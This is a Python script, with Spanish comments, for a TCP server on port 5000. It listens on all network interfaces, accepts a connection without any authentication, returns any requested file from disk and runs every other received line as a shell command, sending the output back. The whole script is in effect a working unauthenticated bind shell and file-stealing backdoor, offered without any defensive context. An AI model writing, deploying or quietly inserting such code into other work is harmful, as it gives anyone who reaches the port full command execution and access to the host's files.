import socket
import os

HOST = "0.0.0.0"   # Escucha en todas las interfaces
PORT = 5000

def send_file(conn, filename):
    if os.path.exists(filename):
        conn.sendall(b"EXISTS " + str(os.path.getsize(filename)).encode())
        with open(filename, "rb") as f:
            data = f.read(1024)
            while data:
                conn.sendall(data)
                data = f.read(1024)
        print(f"Archivo '{filename}' enviado con éxito.")
    else:
        conn.sendall(b"NOFILE")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"Servidor escuchando en {HOST}:{PORT}")

        conn, addr = server.accept()
        with conn:
            print(f"Conectado con {addr}")
            while True:
                data = conn.recv(1024).decode().strip()
                if not data:
                    break

                if data.startswith("GET "):  # Petición de archivo
                    filename = data[4:]
                    send_file(conn, filename)

                elif data == "EXIT":
                    print("Cliente desconectado.")
                    break

                else:  # Ejecutar comando en la terminal del servidor
                    try:
                        output = os.popen(data).read()
                        if output:
                            conn.sendall(output.encode())
                        else:
                            conn.sendall(b"[Sin salida]")
                    except Exception as e:
                        conn.sendall(f"Error: {e}".encode())

if __name__ == "__main__":
    main()
